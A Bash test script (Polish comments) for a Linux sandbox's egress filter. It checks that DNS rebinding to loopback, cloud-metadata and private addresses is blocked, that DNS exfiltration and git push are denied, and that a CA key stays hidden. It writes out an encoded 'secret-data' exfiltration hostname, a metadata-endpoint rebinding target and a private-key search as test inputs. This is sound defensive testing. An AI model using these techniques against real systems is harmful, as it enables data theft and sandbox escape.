#!/usr/bin/env bash
# test-egress.sh - testy Egress Guard z issue #16 (offline, deterministyczne).
#
# Caly test dziala w osobnym, pustym network namespace i mount namespace ("hermetyczny
# host"): wlasny loopback, wlasny /etc/hosts (nazwy testowe, w tym rebinding na
# 127.0.0.1, 169.254.169.254, 10/8, 100.64/10, ::ffff:127.0.0.1) i wlasny resolv.conf
# wskazujacy na "szpiega" DNS na 127.0.0.1:53, ktory zapisuje kazde otrzymane zapytanie.
# Dzieki temu test niczego nie zmienia na prawdziwym hoscie i moze udowodnic, ze stub
# DNS w sandboksie niczego nie przekazuje dalej.
#
# Sprawdza dla kazdego backendu (unshare, bwrap):
#   (R) filtr adresow po rozwiazaniu nazwy (DNS rebinding) i flagi loopback/private,
#   (U) proxy nadrzedne: ruch dozwolony przez nie, odmowa nadrzednego w audycie,
#       allowlista nadal obowiazuje, adres proxy nadrzednego tez jest filtrowany,
#   (D) stub DNS: nazwa z allowlisty dziala (takze bez HTTPS_PROXY, przez
#       przechwytywanie w moscie), spoza allowlisty nie, brak przekazywania zapytan,
#   (G) git przez terminacje TLS: clone/fetch dzialaja, push odrzucony i zalogowany,
#       forge weryfikowany (bez --upstream-ca odmowa), klucz CA niewidoczny w sandboksie,
#   (8) stub DNS i rebinding bez uprawnien administratora (uid 65534).
#
# Wymaga roota (unshare --net --mount dla hermetycznego hosta); bez roota: SKIP.
# Uzycie: ./test-egress.sh    TEST_BACKENDS=unshare ./test-egress.sh
set -uo pipefail

DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PY="$(command -v python3)"

if [[ "${EGRESS_TEST_INNER:-}" != 1 ]]; then
  if [[ $EUID -ne 0 ]] || ! command -v unshare >/dev/null 2>&1; then
    echo "test-egress: SKIP (wymaga roota i unshare do zbudowania hermetycznego hosta)"
    exit 0
  fi
  exec unshare --net --mount --propagation private env EGRESS_TEST_INNER=1 bash "$0" "$@"
fi

RUN="$DIR/run-sandboxed.sh"
if [[ -z "${TEST_BACKENDS:-}" ]]; then
  TEST_BACKENDS="unshare"
  command -v bwrap >/dev/null 2>&1 && TEST_BACKENDS="unshare bwrap"
fi

PASS=0; FAIL=0
pass() { PASS=$((PASS + 1)); printf '  PASS  %s\n' "$1"; }
fail() { FAIL=$((FAIL + 1)); printf '  FAIL  %s\n' "$1"; [[ -n "${2:-}" ]] && printf '        %s\n' "$2"; }
check() { local name="$1"; shift; if "$@" >/dev/null 2>&1; then pass "$name"; else fail "$name"; fi; }
check_not() { local name="$1"; shift; if "$@" >/dev/null 2>&1; then fail "$name"; else pass "$name"; fi; }
expect_eq() { if [[ "$2" == "$3" ]]; then pass "$1"; else fail "$1" "oczekiwano '$3', jest '$2'"; fi; }
has_marker() { grep -qx -- "$2" <<< "$1" && pass "$3" || fail "$3" "$(tr '\n' ' ' <<< "$1" | cut -c1-400)"; }

# Czy w pliku JSON lines jest wpis spelniajacy wszystkie warunki klucz=wartosc?
audit_has() {
  "$PY" -I - "$@" <<'EOF'
import json, sys
path, conds = sys.argv[1], dict(a.split("=", 1) for a in sys.argv[2:])
try:
    lines = open(path).read().splitlines()
except FileNotFoundError:
    sys.exit(1)
for line in lines:
    rec = json.loads(line)
    if all(str(rec.get(k)) == v for k, v in conds.items()):
        sys.exit(0)
sys.exit(1)
EOF
}

T="$(mktemp -d "${TMPDIR:-/tmp}/conductor-egress-test.XXXXXX")"
chmod 755 "$T"
PIDS=()
cleanup() {
  for p in "${PIDS[@]}"; do kill "$p" 2>/dev/null; wait "$p" 2>/dev/null; done
  rm -rf "$T"
}
trap cleanup EXIT

# --- hermetyczny host: lo, /etc/hosts, resolv.conf -> szpieg DNS ---------------------
"$PY" -I -c '
import fcntl, socket, struct
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
flags = struct.unpack("16sH22x", fcntl.ioctl(s, 0x8913, struct.pack("16sH22x", b"lo", 0)))[1]
fcntl.ioctl(s, 0x8914, struct.pack("16sH22x", b"lo", flags | 1))'
cat > "$T/hosts" <<'EOF'
127.0.0.1 localhost
::1 localhost ip6-localhost
127.0.0.1 rebind.corp.test loopok.corp.test forge.corp.test
169.254.169.254 metadata.corp.test
10.1.2.3 internal.corp.test privok.corp.test
100.64.1.1 cgnat.corp.test
::ffff:127.0.0.1 mapped.corp.test
EOF
printf 'nameserver 127.0.0.1\noptions timeout:1 attempts:1\n' > "$T/resolv.conf"
chmod 644 "$T/hosts" "$T/resolv.conf"
mount --bind "$T/hosts" /etc/hosts
mount --bind "$T/resolv.conf" /etc/resolv.conf

wait_file() { for _ in $(seq 1 200); do [[ -s "$1" ]] && return 0; sleep 0.05; done; return 1; }

# Szpieg DNS (resolver "hosta"): zapisuje kazde zapytanie; dla *.dns.corp.test odpowiada
# 127.0.0.1 (nazwy, ktorych NIE ma w /etc/hosts, wiec sandbox moze je poznac tylko przez
# stub), dla reszty NXDOMAIN.
"$PY" -I -c '
import socket, sys
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.bind(("127.0.0.1", 53))
open(sys.argv[1] + ".ready", "w").write("1")
while True:
    data, addr = s.recvfrom(4096)
    p, labels = 12, []
    while p < len(data) and data[p]:
        labels.append(data[p + 1:p + 1 + data[p]].decode("ascii", "replace")); p += 1 + data[p]
    name = ".".join(labels).lower()
    with open(sys.argv[1], "a") as f: f.write(name + "\n")
    q, qtype = data[12:p + 5], data[p + 1:p + 3]
    if name.endswith(".dns.corp.test") and qtype == b"\x00\x01":
        ans = b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x05\x00\x04\x7f\x00\x00\x01"
        s.sendto(data[:2] + b"\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" + q + ans, addr)
    elif name.endswith(".dns.corp.test"):
        s.sendto(data[:2] + b"\x81\x80\x00\x01\x00\x00\x00\x00\x00\x00" + q, addr)
    else:
        s.sendto(data[:2] + b"\x81\x83\x00\x01\x00\x00\x00\x00\x00\x00" + q, addr)
' "$T/spy.log" &
PIDS+=($!)
wait_file "$T/spy.log.ready"; touch "$T/spy.log"

# Lokalny "gateway" (HTTP) i "forge" (HTTPS + git http-backend). Konfiguracja git hosta
# (podpisywanie commitow, proxy) nie ma wplywu na test.
export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1
PORT="$("$PY" -c 'import socket;s=socket.socket();s.bind(("127.0.0.1",0));print(s.getsockname()[1])')"
mkdir -p "$T/www"; echo "hello-from-gateway" > "$T/www/hello.txt"
"$PY" -m http.server "$PORT" --bind 127.0.0.1 --directory "$T/www" >/dev/null 2>&1 &
PIDS+=($!)
for _ in $(seq 1 100); do curl -s --noproxy '*' -o /dev/null "http://127.0.0.1:$PORT/" && break; sleep 0.05; done

HAVE_GIT=0
if command -v openssl >/dev/null && [[ -x "$(git --exec-path 2>/dev/null)/git-http-backend" ]]; then
  HAVE_GIT=1
  "$PY" -I "$DIR/test-forge.py" --gen-certs "$T/forge-certs" --hostname forge.corp.test
  mkdir -p "$T/forge/src" "$T/repos"
  git -C "$T/forge/src" init -q -b main
  echo "forge content" > "$T/forge/src/README"
  git -C "$T/forge/src" add README
  git -C "$T/forge/src" -c user.name=t -c user.email=t@example.invalid -c commit.gpgsign=false commit -qm init
  git clone -q --bare "$T/forge/src" "$T/repos/repo.git"
  git -C "$T/repos/repo.git" config http.receivepack true   # forge PRZYJALBY push
  "$PY" -I "$DIR/test-forge.py" --certs "$T/forge-certs" --repos "$T/repos" \
    --port-file "$T/forge.port" --log "$T/forge.log" >/dev/null 2>&1 &
  PIDS+=($!)
  wait_file "$T/forge.port"; FPORT="$(cat "$T/forge.port")"; touch "$T/forge.log"
fi

"$PY" -I "$DIR/test-upstream-proxy.py" --port-file "$T/up.port" --log "$T/up.log" \
  --allow "localhost:$PORT" ${FPORT:+--allow "forge.corp.test:$FPORT"} >/dev/null 2>&1 &
PIDS+=($!)
wait_file "$T/up.port"; UPORT="$(cat "$T/up.port")"; touch "$T/up.log"

cat > "$T/allow-rebind.txt" <<EOF
localhost:$PORT plaintext
rebind.corp.test:$PORT plaintext
loopok.corp.test:$PORT plaintext loopback
metadata.corp.test:$PORT plaintext loopback private
internal.corp.test:$PORT plaintext loopback
privok.corp.test:$PORT plaintext private
cgnat.corp.test:$PORT plaintext loopback
mapped.corp.test:$PORT plaintext
127.0.0.1:$PORT plaintext
EOF
cat > "$T/allow-upstream.txt" <<EOF
localhost:$PORT plaintext
denied.corp.test:$PORT plaintext
${FPORT:+forge.corp.test:$FPORT git}
EOF
cat > "$T/allow-dns.txt" <<EOF
gw.dns.corp.test:$PORT plaintext loopback
EOF
cat > "$T/allow-git.txt" <<EOF
forge.corp.test:${FPORT:-1} git loopback
EOF

echo "Conductor sandbox-linux: testy Egress Guard #16 (backendy: $TEST_BACKENDS, gateway :$PORT, forge :${FPORT:-brak}, upstream :$UPORT)"

for B in $TEST_BACKENDS; do
  echo
  echo "== egress, backend: $B"
  WT="$T/$B/worktree"; AUDIT="$T/$B/audit.jsonl"
  mkdir -p "$WT"
  sbx() { local al="$1"; shift; "$RUN" --backend "$B" --allowlist "$al" --audit-log "$AUDIT" --id "egress-$B" "$@"; }
  CURL=(curl -sS -m 10 -p)

  echo "-- (R) filtr adresow po rozwiazaniu nazwy (DNS rebinding)"
  A="$T/allow-rebind.txt"
  check_not "localhost bez flagi loopback odrzucony" sbx "$A" "$WT" -- "${CURL[@]}" "http://localhost:$PORT/hello.txt"
  check "audyt: localhost reason=resolved_to_special_address address_class=loopback" \
    audit_has "$AUDIT" decision=deny host=localhost reason=resolved_to_special_address address_class=loopback
  check_not "rebind.corp.test -> 127.0.0.1 odrzucony" sbx "$A" "$WT" -- "${CURL[@]}" "http://rebind.corp.test:$PORT/hello.txt"
  check "audyt: rebind.corp.test resolved_to_special_address" \
    audit_has "$AUDIT" decision=deny host=rebind.corp.test reason=resolved_to_special_address address=127.0.0.1
  out="$(sbx "$A" "$WT" -- "${CURL[@]}" "http://loopok.corp.test:$PORT/hello.txt" 2>&1)"
  expect_eq "loopok.corp.test z flaga loopback dziala" "$out" "hello-from-gateway"
  check "audyt: allow loopok.corp.test resolved=127.0.0.1" audit_has "$AUDIT" decision=allow host=loopok.corp.test resolved=127.0.0.1
  check_not "metadata.corp.test -> 169.254.169.254 odrzucony mimo flag loopback i private" \
    sbx "$A" "$WT" -- "${CURL[@]}" "http://metadata.corp.test:$PORT/"
  check "audyt: metadata address_class=link_local" \
    audit_has "$AUDIT" decision=deny host=metadata.corp.test reason=resolved_to_special_address address=169.254.169.254 address_class=link_local
  check_not "internal.corp.test -> 10.1.2.3 (tylko loopback) odrzucony" sbx "$A" "$WT" -- "${CURL[@]}" "http://internal.corp.test:$PORT/"
  check "audyt: internal address_class=private (rfc1918)" \
    audit_has "$AUDIT" decision=deny host=internal.corp.test address_class=private address_detail=rfc1918
  check_not "cgnat.corp.test -> 100.64.1.1 odrzucony" sbx "$A" "$WT" -- "${CURL[@]}" "http://cgnat.corp.test:$PORT/"
  check "audyt: cgnat address_detail=cgnat" audit_has "$AUDIT" decision=deny host=cgnat.corp.test address_detail=cgnat
  check_not "mapped.corp.test -> ::ffff:127.0.0.1 odrzucony" sbx "$A" "$WT" -- "${CURL[@]}" "http://mapped.corp.test:$PORT/"
  check "audyt: mapped address_class=loopback" audit_has "$AUDIT" decision=deny host=mapped.corp.test reason=resolved_to_special_address address_class=loopback
  check_not "literal 127.0.0.1 z allowlisty bez flagi loopback odrzucony" sbx "$A" "$WT" -- "${CURL[@]}" "http://127.0.0.1:$PORT/"
  check "audyt: 127.0.0.1 resolved_to_special_address" audit_has "$AUDIT" decision=deny host=127.0.0.1 reason=resolved_to_special_address
  check_not "privok.corp.test (flaga private) przechodzi filtr, ale 10.1.2.3 jest nieosiagalny" \
    sbx "$A" "$WT" -- "${CURL[@]}" "http://privok.corp.test:$PORT/"
  check "audyt: privok reason=upstream_connect_failed (filtr przepuscil)" \
    audit_has "$AUDIT" decision=deny host=privok.corp.test reason=upstream_connect_failed

  echo "-- (U) proxy nadrzedne"
  A="$T/allow-upstream.txt"
  UP=(--upstream-proxy "http://127.0.0.1:$UPORT" --upstream-proxy-allow loopback)
  out="$(sbx "$A" "${UP[@]}" "$WT" -- "${CURL[@]}" "http://localhost:$PORT/hello.txt" 2>&1)"
  expect_eq "localhost:$PORT przez proxy nadrzedne dziala" "$out" "hello-from-gateway"
  check "audyt: allow via=upstream" audit_has "$AUDIT" decision=allow host=localhost via=upstream upstream="127.0.0.1:$UPORT"
  check "proxy nadrzedne dostalo CONNECT localhost:$PORT (nazwa, nie adres)" audit_has "$T/up.log" target="localhost:$PORT" decision=allow
  check_not "denied.corp.test: odmowa proxy nadrzednego" sbx "$A" "${UP[@]}" "$WT" -- "${CURL[@]}" "http://denied.corp.test:$PORT/"
  check "audyt: reason=upstream_proxy_refused upstream_status=403" \
    audit_has "$AUDIT" decision=deny host=denied.corp.test reason=upstream_proxy_refused upstream_status=403
  check_not "example.com (spoza allowlisty) odrzucony" sbx "$A" "${UP[@]}" "$WT" -- "${CURL[@]}" https://example.com/
  check_not "proxy nadrzedne nie zobaczylo example.com (allowlista obowiazuje)" grep -q example.com "$T/up.log"
  check_not "proxy nadrzedne na loopbacku bez --upstream-proxy-allow odrzucone" \
    sbx "$A" --upstream-proxy "http://127.0.0.1:$UPORT" "$WT" -- "${CURL[@]}" "http://localhost:$PORT/hello.txt"
  check "audyt: reason=upstream_proxy_special_address" audit_has "$AUDIT" decision=deny reason=upstream_proxy_special_address address_class=loopback
  if [[ $HAVE_GIT == 1 ]]; then
    out="$(sbx "$A" "${UP[@]}" --upstream-ca "$T/forge-certs/ca.crt" "$WT" -- \
      git clone -q "https://forge.corp.test:$FPORT/repo.git" /tmp/c 2>&1 && echo CLONED)"
    has_marker "$out" CLONED "git clone (regula git) przez proxy nadrzedne dziala"
    check "proxy nadrzedne dostalo CONNECT forge.corp.test:$FPORT" audit_has "$T/up.log" target="forge.corp.test:$FPORT" decision=allow
  fi

  echo "-- (D) stub DNS w sandboksie (--dns stub)"
  A="$T/allow-dns.txt"
  out="$(sbx "$A" --dns stub "$WT" -- python3 -I -c '
import socket
print(socket.gethostbyname("gw.dns.corp.test"))
for n in ("example.com", "c2VjcmV0LWRhdGE.exfil.example"):
    try:
        socket.getaddrinfo(n, 443); print("RESOLVED", n)
    except socket.gaierror:
        print("NX", n)
try:
    socket.getaddrinfo("gw.dns.corp.test", 80, socket.AF_INET6); print("AAAA_ANSWER")
except socket.gaierror:
    print("AAAA_NODATA")' 2>&1)"
  [[ "$out" == 127.77.* ]] && pass "gw.dns.corp.test (allowlista) -> fikcyjny adres $(head -1 <<< "$out")" \
    || fail "gw.dns.corp.test (allowlista) -> fikcyjny adres" "$out"
  has_marker "$out" "NX example.com" "example.com (spoza allowlisty): NXDOMAIN"
  has_marker "$out" AAAA_NODATA "AAAA dla nazwy z allowlisty: pusta odpowiedz (tylko IPv4 127.77/16)"
  has_marker "$out" "NX c2VjcmV0LWRhdGE.exfil.example" "nazwa exfil: NXDOMAIN"
  check "audyt: dns allow gw.dns.corp.test" audit_has "$AUDIT" event=dns decision=allow name=gw.dns.corp.test qtype=A
  check "audyt: dns deny example.com" audit_has "$AUDIT" event=dns decision=deny name=example.com reason=not_in_allowlist
  check "audyt: dns deny nazwy exfil" audit_has "$AUDIT" event=dns decision=deny name=c2vjcmv0lwrhdge.exfil.example
  out="$(sbx "$A" --dns stub "$WT" -- curl -sS -m 10 --noproxy '*' "http://gw.dns.corp.test:$PORT/hello.txt" 2>&1)"
  expect_eq "curl bez proxy na gw.dns.corp.test (przechwytywanie w moscie -> Egress Guard)" "$out" "hello-from-gateway"
  check "audyt: connect allow gw.dns.corp.test" audit_has "$AUDIT" event=connect decision=allow host=gw.dns.corp.test
  check_not "fikcyjny adres bez nazwy (127.77.9.9) nie prowadzi nigdzie" \
    sbx "$A" --dns stub "$WT" -- curl -sS -m 5 --noproxy '*' "http://127.77.9.9:$PORT/hello.txt"
  check "resolv.conf w sandboksie wskazuje na stub (--etc full tez)" \
    sbx "$A" --dns stub --etc full "$WT" -- grep -q "conductor dns stub" /etc/resolv.conf
  check_not "bez --dns stub: brak rozwiazywania nazw z allowlisty" sbx "$A" "$WT" -- python3 -I -c '
import socket; socket.gethostbyname("gw.dns.corp.test")'
  check "UDP i TCP 53 dzialaja (zapytanie TXT po TCP: NOERROR bez odpowiedzi)" sbx "$A" --dns stub "$WT" -- python3 -I -c '
import socket, struct, sys
q = struct.pack("!6H", 7, 0x0100, 1, 0, 0, 0) + b"\x02gw\x03dns\x04corp\x04test\x00" + struct.pack("!HH", 16, 1)
s = socket.create_connection(("127.0.0.1", 53), timeout=5); s.sendall(struct.pack("!H", len(q)) + q)
r = s.recv(4096)[2:]
sys.exit(not (r[:2] == q[:2] and r[3] & 0xF == 0 and struct.unpack("!H", r[6:8])[0] == 0))'
  check_not "szpieg DNS (resolver hosta) nie dostal zadnego zapytania z sandboksa" grep -Eq 'exfil|example\.com' "$T/spy.log"
done

if [[ $HAVE_GIT == 1 ]]; then
  for B in $TEST_BACKENDS; do
    echo
    echo "== git przez Egress Guard (terminacja TLS), backend: $B"
    WT="$T/$B/worktree"; AUDIT="$T/$B/audit-git.jsonl"
    sbx() { "$RUN" --backend "$B" --allowlist "$T/allow-git.txt" --audit-log "$AUDIT" --id "git-$B" "$@"; }
    URL="https://forge.corp.test:$FPORT/repo.git"
    before="$(git -C "$T/repos/repo.git" for-each-ref | md5sum)"
    : > "$T/forge.log"
    out="$(sbx --upstream-ca "$T/forge-certs/ca.crt" "$WT" -- sh -c '
      git clone -q "$1" /tmp/c && echo CLONE_OK && cat /tmp/c/README
      cd /tmp/c && git fetch -q origin && echo FETCH_OK
      echo change > f && git add f && git -c user.name=a -c user.email=a@x.invalid commit -qm agent
      if git push -q origin HEAD:refs/heads/agent-push 2>/tmp/err; then echo PUSH_OK; else echo PUSH_DENIED; fi
      grep -q "requires human approval" /tmp/err && echo PUSH_MESSAGE
      code=$(curl -s -o /dev/null -w "%{http_code}" "$1/info/refs?service=git-receive-pack"); echo "RECEIVE_INFO_$code"
      code=$(curl -s -o /dev/null -w "%{http_code}" "$1/HEAD"); echo "DUMB_$code"
      env | grep -q "^GIT_SSL_CAINFO=/run/conductor/egress/ca-bundle.crt$" && echo CA_ENV
      grep -rlsIE --exclude-dir=bin "BEGIN (EC )?PRIVATE KEY" /run /tmp >/dev/null 2>&1 || echo NO_PRIVATE_KEY
    ' sh "$URL" 2>&1)"
    has_marker "$out" CLONE_OK "git clone przez proxy z terminacja TLS dziala"
    has_marker "$out" "forge content" "sklonowana tresc z forge"
    has_marker "$out" FETCH_OK "git fetch dziala"
    has_marker "$out" PUSH_DENIED "git push odrzucony"
    has_marker "$out" PUSH_MESSAGE "git pokazuje komunikat o wymaganej zgodzie"
    has_marker "$out" RECEIVE_INFO_403 "GET info/refs?service=git-receive-pack -> 403"
    has_marker "$out" DUMB_403 "dumb HTTP (GET /repo.git/HEAD) -> 403"
    has_marker "$out" CA_ENV "GIT_SSL_CAINFO wskazuje na paczke z CA sandboksa"
    has_marker "$out" NO_PRIVATE_KEY "klucz prywatny CA niewidoczny w sandboksie (/run, /tmp)"
    check "audyt: git_request allow op=fetch" audit_has "$AUDIT" event=git_request decision=allow op=fetch
    check "audyt: git push reason=git_push_requires_approval" \
      audit_has "$AUDIT" event=git_request decision=deny op=push reason=git_push_requires_approval
    check "audyt: dumb HTTP reason=git_request_not_allowed" audit_has "$AUDIT" event=git_request decision=deny reason=git_request_not_allowed
    check "forge dostal git-upload-pack" grep -q "git-upload-pack" "$T/forge.log"
    check_not "forge NIE dostal zadnego zadania git-receive-pack" grep -q "git-receive-pack" "$T/forge.log"
    expect_eq "refy na forge bez zmian" "$(git -C "$T/repos/repo.git" for-each-ref | md5sum)" "$before"
    out="$(sbx "$WT" -- sh -c 'git clone -q "$1" /tmp/c 2>&1 || echo CLONE_FAILED' sh "$URL" 2>&1)"
    has_marker "$out" CLONE_FAILED "bez --upstream-ca forge z nieznanym CA odrzucony"
    check "audyt: reason=upstream_tls_failed" audit_has "$AUDIT" event=git_request reason=upstream_tls_failed
  done
  echo
  echo "== kontrola: forge przyjmuje push poza sandboksem (odmowa pochodzi z Egress Guard)"
  out="$(env -i PATH="$PATH" HOME="$T" GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1 git -C "$T/forge/src" -c http.sslCAInfo="$T/forge-certs/ca.crt" push -q \
    "https://forge.corp.test:$FPORT/repo.git" main:refs/heads/host-push 2>&1)"
  if grep -q '"POST", "path": "/repo.git/git-receive-pack"' "$T/forge.log"; then
    pass "push z hermetycznego hosta bez proxy dotarl do forge"
  else
    fail "push z hermetycznego hosta bez proxy dotarl do forge" "$out"
  fi
else
  echo
  echo "== git: SKIP (brak openssl albo git http-backend)"
fi

# --- (8) bez uprawnien administratora ------------------------------------------------
if command -v setpriv >/dev/null 2>&1; then
  RL="$T/rootless"; mkdir -p "$RL/wt"; cp "$T/allow-dns.txt" "$T/allow-rebind.txt" "$RL/"
  chown -R 65534:65534 "$RL"
  for B in $TEST_BACKENDS; do
    echo
    echo "== (8) rootless (uid 65534), backend: $B"
    rsbx() { local al="$1"; shift; setpriv --reuid=65534 --regid=65534 --clear-groups env TMPDIR="$RL" HOME="$RL" \
               "$RUN" --backend "$B" --allowlist "$al" --audit-log "$RL/audit-$B.jsonl" "$@"; }
    out="$(rsbx "$RL/allow-dns.txt" --dns stub "$RL/wt" -- curl -sS -m 10 --noproxy '*' "http://gw.dns.corp.test:$PORT/hello.txt" 2>&1)"
    expect_eq "stub DNS + przechwytywanie bez roota" "$out" "hello-from-gateway"
    check "CapEff=0 i NoNewPrivs=1 takze z --dns stub" rsbx "$RL/allow-dns.txt" --dns stub "$RL/wt" -- sh -c \
      'grep -q "^CapEff:[[:space:]]*0*$" /proc/self/status && grep -q "^NoNewPrivs:[[:space:]]*1$" /proc/self/status'
    check_not "rebinding bez roota: rebind.corp.test odrzucony" rsbx "$RL/allow-rebind.txt" "$RL/wt" -- curl -sS -m 10 -p "http://rebind.corp.test:$PORT/"
    check "audyt: resolved_to_special_address" audit_has "$RL/audit-$B.jsonl" decision=deny host=rebind.corp.test reason=resolved_to_special_address
  done
fi

# --- kontrola szpiega: zapytanie z hermetycznego hosta (poza sandboksem) dociera -----
getent hosts control.spy-check.example >/dev/null 2>&1
check "kontrola: szpieg DNS widzi zapytania spoza sandboksa (test jest czuly)" grep -q control.spy-check.example "$T/spy.log"

echo
echo "Egress: $PASS PASS, $FAIL FAIL"
[[ $FAIL -eq 0 ]]
